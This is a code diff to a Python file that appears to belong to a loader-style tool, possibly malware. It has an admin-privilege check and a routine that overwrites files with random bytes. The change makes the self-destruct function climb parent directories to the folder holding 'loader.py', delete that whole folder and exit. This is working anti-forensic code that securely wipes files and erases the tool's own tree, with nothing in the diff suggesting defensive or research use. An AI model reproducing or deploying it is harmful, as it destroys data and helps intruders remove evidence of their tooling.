@@ -3,6 +3,7 @@ import subprocess
 import os
 import ctypes
 import shutil
+import sys
 
 def is_admin():
     """ check for privilege """
@@ -38,7 +39,23 @@ def wipe_file(file_path, passes=1):
                 file.write(os.urandom(length))
     except:
         return False
-    
+
+def root_folder(locate_file="loader.py"):
+    """ Moves up the folder until this file is found """
+    current_dir = os.path.dirname(os.path.realpath(__file__))
+    while True:
+        current_file = os.path.join(current_dir, locate_file)
+        if os.path.isfile(current_file):
+            print(f"Found")
+            return current_dir
+        
+        parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
+        if parent_dir == current_dir:
+            print(f"Nothing found")
+            return None
+        
+        current_dir = parent_dir
+
 def delete_folder(folder_path):
     """ Removes whole folder containing program """
     try:
@@ -51,13 +68,20 @@ def delete_folder(folder_path):
     except:
         return False
 
-def self_destruct():
+def self_destruct(locate_file="loader.py"):
     """ destroy self """
     try:
         # current_pwd = os.path.realpath(__file__)
-        current_pwd = os.path.dirname(os.path.realpath(__file__))
+        # current_pwd = os.path.dirname(os.path.realpath(__file__))
         # os.remove(current_pwd)
-        delete_folder(current_pwd)
+        root = root_folder(locate_file)
+        # delete_folder(current_pwd)
+        if not root:
+            print("Failed")
+            return
+        
+        delete_folder(root)
+        sys.exit(0)
     except:
         return False
 
